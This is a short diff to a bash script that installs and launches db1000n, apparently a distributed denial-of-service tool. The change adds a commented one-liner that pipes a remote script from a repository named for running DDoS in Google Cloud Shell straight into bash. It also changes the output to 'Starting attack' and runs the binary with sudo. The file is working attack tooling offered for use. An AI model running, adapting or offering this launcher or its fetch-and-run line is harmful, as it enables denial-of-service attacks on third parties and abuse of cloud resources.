@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-
+#curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/db1000n_GShell.sh | bash
 set -euo pipefail
 
 REPO=${REPO:-"Arriven/db1000n"}
@@ -33,6 +33,6 @@ else
 fi
 
 tar xvf "${ARCHIVE}"
-echo "Successfully installed db1000n"
-sleep 5
+echo "Successfully installed db1000n. Starting attack"
+sleep 2
 sudo ./db1000n
